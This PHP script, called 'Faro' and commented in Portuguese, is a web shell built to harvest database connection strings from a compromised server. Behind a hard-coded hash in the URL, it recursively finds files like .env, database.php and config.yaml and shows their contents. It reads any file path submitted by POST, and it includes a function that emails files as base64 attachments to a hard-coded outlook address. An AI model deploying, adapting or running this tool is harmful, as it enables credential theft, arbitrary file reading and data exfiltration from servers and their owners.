<?php

/**
 * Procura por strings de conexões
 *
 * @category PHP
 * @package  Faro
 * @author   Guilherme Vinicius <guilhermevini@outlook.com>
 * @license  https://github.com/guilhermevini/faro/blob/master/LICENSE GNU GPL v3.0
 * @link     https://github.com/guilhermevini/faro
 */
class Faro
{
    /**
     * Coleção de arquivos a serem analisados
     *
     * @var array
     */
    private $_allowedFiles = array('config.yaml', '.env', 'doctrine.php',
                                   'settings.php', 'database.php', 'conexao.php',
                                   'db.php');

    /**
     * Coleção de vermos a serem analisados nos arquivos
     *
     * @var array
     */
    private $_allowedVars = array('DB_USERNAME', 'dbname', 'database', 'db',
                                  'pdo_mysql', 'username', 'host', 'password');

    /**
     * Coleção de objetos a serem ignorados
     *
     * @var array
     */
    private $_ignore = array('.', '..', 'cgi-bin', 'node_modules', 'vendor');

    /**
     * Logs container
     *
     * @var array
     */
    private $_log = array();

    /**
     * Saida do HTML
     *
     * @var array
     */
    private $_output = array();

    /**
     * Usuário Ativo
     *
     * @var array
     */
    private $_user = "";

    /**
     * Tipo de renderização
     *
     * @var array
     */
    public $html = false;

    /**
     * Inicia o script
     *
     * @return void
     */
    public function start()
    {
        if ($this->_authorized()) {
            $this->_dispacher();
        }
    }

    /**
     * Resolve o processo a ser chamado de acordo com a vontade do usuario
     *
     * @return void
     */
    private function _dispacher()
    {
        if ($this->_hasPath()) {
            $this->_showFile();
        } else {
            $this->_processDirectory(dirname(__FILE__));
            array_push($this->_output, "<div id=\"logs\">" . implode('<br />', $this->_log) . "</div>");
            $this->html = true;
        }
    }

    /**
     * Renderiza HTML
     *
     * @return void
     */
    public function renderHtml()
    {
        foreach ($this->_output as $item) {
            echo $item;
        }
    }

    /**
     * Mostra Conteudo do Arquivo
     *
     * @return void
     */  
    private function _showFile()
    {
        $path = $_POST["path"];
        $fp = fopen($path, "rb");
        $body = fread($fp, filesize($path));
        echo $body;
        fclose($fp);
    }

    /**
     * Verifica se o usuário passou algum arquivo
     *
     * @return bool
     */  
    private function _hasPath()
    {
        return isset($_POST["path"]);
    }

    /**
     * Verifica se o usuário está autorizado a continuar.
     *
     * @return bool
     */  
    private function _authorized()
    {
        $status = (isset($_GET["user"]) &&
                         $_GET["user"] == '89614df4a09990e97ef425f1fe8a11f6');
        
        if ($status) {
            $this->_user = $_GET["user"];
        }
        
        array_push($this->_log, "_authorized: " . $status);
        return $status;
    }

    /**
     * Processa diretorio a procura de arquivos com strings de conexao
     *
     * @param string $path  caminho inicial da varredura
     * @param string $level nível inicial do caminho
     *
     * @return void
     */
    private function _processDirectory($path = '.', $level = 0)
    {
        if ($level == 0) {
            array_push($this->_log, "_processDirectory: " . $path);
        }

        $dh = @opendir($path);
        while ( false !== ( $file = readdir($dh) ) ) {
            if (!in_array($file, $this->_ignore)) {
                //$spaces = str_repeat('-', ($level * 4));
                if (is_dir("$path/$file")) {
                    $this->_processDirectory("$path/$file", ($level+1));
                } else {
                    $ext = pathinfo($file, PATHINFO_EXTENSION);
                    if (in_array("$file", $this->_allowedFiles)) {
                        $id = md5("$path/$file");
                        array_push($this->_output, "<span><a data-path=\"$path/$file\" data-id=\"" . $id . "\" href=\"?user=$this->_user\">$path/$file</a></span>");
                        array_push($this->_output, "<textarea id=\"" . $id . "\"></textarea>");
                    }
                }
            }
        }
        closedir($dh); 
    }

    /**
     * Enviar arquivo por email como anexo
     *
     * @param string $path caminho físico do arquivo a ser enviado
     *
     * @return void
     */
    private function _sendFile($path)
    {
        $uid = "XYZ-".md5(date("dmYis"))."-ZYX";

        $fileType = mime_content_type($path);
        $file = basename($path);

        $fp = fopen($path, "rb");
        $body = fread($fp, filesize($path));
        $anexo = chunk_split(base64_encode($body));
        fclose($fp);

        $header  = "MIME-Version: 1.0" . PHP_EOL;
        $header .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"";

        $msg  = "--" . $uid . PHP_EOL;
        $msg .= "Content-type:text/html; charset=iso-8859-1" . PHP_EOL;
        $msg .= "Content-Transfer-Encoding: 8bit" . PHP_EOL . PHP_EOL;
        $msg .= $path . PHP_EOL;

        $msg .= "--" . $uid . PHP_EOL;
        $msg .= "Content-Type: " . $fileType . "; name=\"".$filee."\"" . PHP_EOL;
        $msg .= "Content-Transfer-Encoding: base64" . PHP_EOL;
        $msg .= "Content-Disposition: attachment; filename=\"".$file."\"" . PHP_EOL;
        $msg .= $anexo . PHP_EOL;
        $msg .= "--" . $uid . "--";

        mail('guilhermevini@outlook.com', 'strings', $msg, $header);
    }
}

$faro = new Faro();
$faro->start();

if (!$faro->html) {
    exit;
}

?>
<html>
<head>
    <title>Faro</title>
    <style>
        body { background-color: #000; padding: 50px 25px; color: #FFF; }
        textarea { width: 100%; height: 250px; display: none; margin-bottom: 50px;
        border: 0; background-color: #000; color: #FFF; }
        span { display: block; }
        a { color: #00FF00; }
        h1 { color: #00FF00; }
        #logs { position: absolute; right: 10px; top: 20px;
                background-color: #222; padding: 20px; }
    </style>
</head>
<body>
    <div class="content">
        <?php $faro->renderHtml(); ?>
    </div>
    <script src="//code.jquery.com/jquery-1.12.4.min.js"></script>
    <script type="text/javascript">
    $( document ).ready(function() {
        $( "a" ).click(function( event ) {
            event.preventDefault();
            
            var link = $(this).attr('href');
            var id   = $(this).data('id');
            var path = $(this).data('path');

            $.post( link, { path },function( data ) {
                $( "#" + id ).html( data );
                $( "#" + id ).show();
            });

        });
    });
    </script>
</body>
</html>